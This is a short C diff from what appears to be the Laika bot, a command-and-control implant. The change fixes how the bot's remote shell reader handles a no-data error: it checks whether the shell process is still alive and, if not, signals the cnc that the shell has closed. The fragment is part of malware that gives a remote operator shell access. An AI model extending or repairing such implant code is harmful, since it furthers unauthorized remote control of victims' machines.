@@ -161,8 +161,9 @@ bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
         laikaS_write(sock, readBuf, rd);
         laikaS_endVarPacket(peer);
     } else {
-        if (GetLastError() == ERROR_NO_DATA)
-            return true; /* recoverable, there was no data to read */
+        if (GetLastError() == ERROR_NO_DATA && WaitForSingleObject(shell->procInfo.hProcess, 0) == WAIT_TIMEOUT)
+            return true; /* recoverable, process is still alive */
+        /* unrecoverable error */
 
         /* tell cnc shell is closed */
         laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);
